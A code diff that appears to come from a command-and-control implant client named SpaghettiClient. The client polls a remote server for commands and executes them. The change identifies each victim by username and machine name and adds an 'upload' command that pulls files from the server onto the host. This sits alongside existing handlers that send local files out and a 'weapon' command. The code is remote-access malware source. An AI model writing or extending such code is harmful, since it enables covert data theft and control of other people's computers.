@@ -13,13 +13,15 @@ namespace SpaghettiClient
             string url = String.Format("http://{0}/", host);
             string fs_url = String.Format("http://{0}:{1}/", host, fs_port);
             string location = Directory.GetCurrentDirectory();
-            string sessionid = Guid.NewGuid().ToString();
+            string user = Environment.UserName;
+            string machinename = Environment.MachineName;
+            string sessionid = String.Format("{0}@{1}", user, machinename);
 
             Commands commands = new Commands();
 
             while(true)
             {
-                String cmd = Utilities.Get(url, location);
+                String cmd = Utilities.Get(url, location, sessionid);
 
                 if (cmd.ToLower() == "exit")
                 {
@@ -39,8 +41,16 @@ namespace SpaghettiClient
                 }
                 else if (cmd.ToLower().StartsWith("download "))
                 {
-                    string filename = cmd.Substring(9).Replace("\"","");
+                    string filename = cmd.Substring(9).Replace("\"", "");
                     Utilities.Put(fs_url, url, filename, location, sessionid);
+                }
+                else if (cmd.ToLower().StartsWith("upload "))
+                {
+                    string filename = cmd.Substring(7).Replace("\"", "");
+                    string target = String.Format("{0}Storage/{1}/{2}", fs_url, sessionid, filename);
+                    string[] splitted = filename.Split('/');
+                    filename = splitted[splitted.Length - 1];
+                    Utilities.GetFile(target, url, filename, location, sessionid);
                 }
                 else if (cmd.ToLower().StartsWith("weapon "))
                 {
